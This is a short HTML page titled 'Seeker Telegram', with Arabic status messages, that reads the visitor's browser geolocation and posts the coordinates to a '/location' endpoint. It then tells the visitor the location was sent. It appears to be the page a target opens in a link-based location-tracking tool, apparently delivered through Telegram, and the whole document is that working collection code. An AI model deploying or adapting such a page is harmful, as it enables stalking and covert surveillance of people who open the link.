<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8"><title>Seeker Telegram</title></head>
<body>
  <h2>🔍 جاري تحديد موقعك...</h2>
  <script>
    navigator.geolocation.getCurrentPosition(position => {
      fetch("/location", {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({
          latitude: position.coords.latitude,
          longitude: position.coords.longitude
        })
      }).then(() => {
        document.body.innerHTML = "<h2>✅ تم إرسال موقعك!</h2>";
      }).catch(() => {
        document.body.innerHTML = "<h2>❌ فشل الإرسال</h2>";
      });
    }, error => {
      document.body.innerHTML = "<h2>❗ تم رفض إذن الموقع</h2>";
    });
  </script>
</body>
</html>
